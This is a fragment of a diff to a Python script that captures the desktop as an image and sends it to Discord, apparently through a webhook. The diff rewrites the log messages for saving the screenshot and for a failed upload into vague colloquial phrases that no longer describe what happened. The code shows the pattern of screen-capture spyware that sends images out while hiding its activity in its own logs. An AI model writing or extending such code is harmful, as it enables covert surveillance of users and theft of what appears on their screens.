@@ -23,7 +23,7 @@ def take_screenshot():
         # Save the image as desktopshot.png
         image.save(screenshot_path)
         image.close()
-        logging.info(f"Screenshot saved to {screenshot_path}")
+        logging.info(f"chwya 7jet o5ra ttsab")
         return screenshot_path
     except Exception as e:
         logging.error(f"Failed to take screenshot: {e}")
@@ -65,7 +65,7 @@ def send_screenshot(screenshot_path):
         if response.status_code == 204:
             logging.info("Screenshot sent successfully to Discord.")
         else:
-            logging.error(f"Failed to send screenshot: {response.status_code}, {response.text}")
+            logging.error(f"thama prob stana")
     
     except Exception as e:
         logging.error(f"Failed to send screenshot: {e}")
